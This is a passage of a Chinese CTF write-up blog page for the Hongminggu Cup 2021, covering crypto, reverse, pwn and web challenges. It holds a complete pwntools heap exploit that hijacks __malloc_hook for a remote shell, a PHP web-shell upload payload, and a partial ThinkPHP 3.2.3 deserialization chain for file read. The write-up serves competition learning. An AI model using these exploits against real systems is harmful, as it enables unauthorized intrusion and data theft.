@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了'><title>红明谷杯 Writeup by X1cT34m</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='红明谷杯 Writeup by X1cT34m'>
+<meta property='og:description' content='红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='代码审计' /><meta property='article:published_time' content='2021-04-03T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-04-03T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png' />
+<meta name="twitter:title" content="红明谷杯 Writeup by X1cT34m">
+<meta name="twitter:description" content="红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png' />
+    <link rel="shortcut icon" href="img/favicon.png" />
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全与代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png" loading="lazy" alt="Featured image of post 红明谷杯 Writeup by X1cT34m" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >
+                代码审计
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/">红明谷杯 Writeup by X1cT34m</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Apr 03, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="misc">Misc</h2>
+<h3 id="签到">签到</h3>
+<p>BP抓包爆破</p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="rsa-attack">RSA attack</h3>
+<p>开三次方根就有了</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">iroot</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p1</span><span class="o">=</span><span class="mi">172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031</span>
+<span class="n">p2</span><span class="o">=</span><span class="mi">172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034</span>
+
+<span class="n">n</span><span class="o">=</span><span class="mi">28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793</span>
+<span class="n">c</span><span class="o">=</span><span class="mi">15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">iroot</span><span class="p">(</span><span class="n">c</span><span class="o">+</span><span class="n">k</span><span class="o">*</span><span class="n">n</span><span class="p">,</span><span class="mi">3</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+        <span class="n">m</span><span class="o">=</span><span class="n">iroot</span><span class="p">(</span><span class="n">c</span><span class="o">+</span><span class="n">k</span><span class="o">*</span><span class="n">n</span><span class="p">,</span><span class="mi">3</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">break</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></div><h2 id="reverse">Reverse</h2>
+<h3 id="go">go</h3>
+<p>调换顺序 ，base58没了</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base58</span>
+
+        
+<span class="n">text</span><span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;2GVdudkYo2CBXoQii7gfpkjTc4gT&#34;</span>
+<span class="n">plaintext</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="n">table1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#34;</span>
+<span class="n">table2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#34;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">table1</span><span class="p">)):</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="n">table1</span><span class="p">[</span><span class="n">j</span><span class="p">]):</span>
+            <span class="n">plaintext</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">table2</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+            <span class="k">break</span>
+<span class="k">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base58</span><span class="o">.</span><span class="n">b58decode</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+
+
+
+
+<span class="n">flag</span><span class="p">{</span><span class="n">We1CTFc0m_2345</span><span class="p">}</span>
+</code></pre></div><p>顺序手动调换</p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="双边协议10">双边协议1.0</h3>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="c1">#context.log_level = &#39;DEBUG&#39;</span>
+<span class="k">def</span> <span class="nf">get_argv</span><span class="p">(</span><span class="n">recv_string</span><span class="p">,</span><span class="n">string</span><span class="p">):</span>
+	<span class="c1">#gdb.attach(p,&#34;b *(0x555555554000+0x1348)&#34;)</span>
+	<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">recv_string</span><span class="p">,</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">string</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">Create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;emUgPj4=&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;bnQgPj4=&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">Free</span><span class="p">():</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;bnQgPj4=&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">View</span><span class="p">():</span>
+	<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.140.179.11&#39;</span><span class="p">,</span><span class="mi">13452</span><span class="p">)</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
+<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;emUgPj4=&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">))</span>
+<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p,&#34;b *(0x555555554000+0xD10)&#34;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3A1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x378</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x18</span>  <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x791</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x788</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x781</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;bnQgPj4=&#39;</span><span class="p">,</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xF30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xF08</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x78</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">View</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x68</span> <span class="c1">#+ 0x100000000</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;LIBC:</span><span class="se">\t</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x10</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">View</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xA10</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;HEAP:</span><span class="se">\t</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;bnQgPj4=&#39;</span><span class="p">,</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;FMYY&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
+
+
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x23</span><span class="p">))</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
+<span class="n">Create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;FMYY&#39;</span><span class="p">)</span>
+<span class="n">get_argv</span><span class="p">(</span><span class="s1">&#39;Pg==&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;bnQgPj4=&#39;</span><span class="p">,</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xF1207</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><h2 id="web">Web</h2>
+<h3 id="write_shell">write_shell</h3>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">pwd</span>
+</code></pre></div><p>得到存储路径</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">upload</span><span class="o">&amp;</span><span class="nx">data</span><span class="o">=&lt;?=</span><span class="sb">`rev%09/*gggg*`</span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>得到结果逆转一下就行</p>
+<h3 id="easytp">easytp</h3>
+<p>扫目录得到<code>www.zip</code></p>
+<p>看到是<code>ThinkPHP 3.2.3</code></p>
+<p><code>/home/index</code>有反序列化：</p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210402202821980.png" alt="image-20210402202821980"  /></p>
+<p>与源码diff一下，看到改了<code>Library\Think\Db\Driver.class.php</code></p>
+<p><img src="https://gitee.com/leonsec/images/raw/master/asadas.png" alt="asadas"  /></p>
+<p>猜测有mysql，记得tp3.2.3有反序列化打数据库类的链：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</p>
+<p>尝试了一下，可以任意文件读</p>
+<p>没读到有用的信息，猜测数据库密码123456</p>
+<p>然后可以报错注入</p>
+<p>poc:</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">namespace</span> <span class="nx">Think\Db\Driver</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">PDO</span><span class="p">;</span>
+    <span class="k">class</span> <span class="nc">Mysql</span><span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_LOCAL_INFILE</span> <span class="o">=&gt;</span> <span class="k">true</span>    <span class="c1">// 开启才能读取文件
+</span><span class="c1"></span>        <span class="p">);</span>
+        <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s2">&#34;debug&#34;</span>    <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+            <span class="s2">&#34;database&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;hostname&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;hostport&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;3306&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;charset&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;password&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;123456&#34;</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Think\Image\Driver</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">Think\Session\Driver\Memcache</span><span class="p">;</span>
+    <span class="k">class</span> <span class="nc">Imagick</span><span class="p">{</span>
+        <span class="k">private</span> <span class="nv">$img</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Think\Session\Driver</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">Think\Model</span><span class="p">;</span>
+    <span class="k">class</span> <span class="nc">Memcache</span><span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$handle</span><span class="p">;</span>
+
